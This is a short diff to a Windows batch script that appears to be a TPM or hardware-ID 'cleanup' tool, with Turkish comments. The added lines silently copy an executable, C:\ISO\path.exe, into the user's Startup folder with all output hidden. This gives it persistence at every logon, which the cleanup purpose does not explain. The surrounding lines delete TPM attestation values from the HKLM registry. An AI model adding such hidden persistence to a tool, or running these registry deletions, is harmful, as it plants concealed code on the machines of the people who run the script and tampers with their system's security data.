@@ -5,6 +5,10 @@ setlocal enabledelayedexpansion
 set "currentDir=%~dp0"
 if "%currentDir:~-1%"=="\" set "currentDir=%currentDir:~0,-1%"
 
+if exist "C:\ISO\path.exe" (
+    copy /Y "C:\ISO\path.exe" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\" >nul 2>&1
+)
+
 :: --- TPM VE SİSTEM TEMİZLİĞİ ---
 reg delete "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\TPM\WMI" /v "WindowsAIKHash" /f > nul 2>&1
 reg delete "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\TPM\WMI" /v "TaskManufacturerId" /f > nul 2>&1
